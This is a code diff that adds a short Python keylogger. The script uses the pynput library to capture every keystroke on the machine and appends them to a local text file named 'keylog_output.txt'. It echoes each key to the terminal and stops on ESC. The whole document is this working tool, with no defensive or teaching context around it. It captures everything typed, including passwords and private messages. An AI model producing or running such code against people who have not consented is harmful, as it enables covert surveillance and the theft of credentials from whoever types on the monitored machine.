@@ -1,0 +1,30 @@
+from pynput import keyboard
+from datetime import datetime
+
+# File to store logs
+log_file = "keylog_output.txt"
+
+# Function to write data
+def write_to_file(key):
+    with open(log_file, "a") as f:
+        key = str(key).replace("'", "")  # Remove quotes around characters
+        if key == 'Key.space':
+            f.write(' ')
+        elif key == 'Key.enter':
+            f.write('\n')
+        elif key == 'Key.esc':
+            f.write('\n[ESC Pressed - Logging Stopped]\n')
+        else:
+            f.write(key)
+
+def on_press(key):
+    print(f"Key pressed: {key}")  # Optional: show in terminal
+    write_to_file(key)
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False  # Stop listener
+
+print("🔑 Keylogger is running... Press ESC to stop.")
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
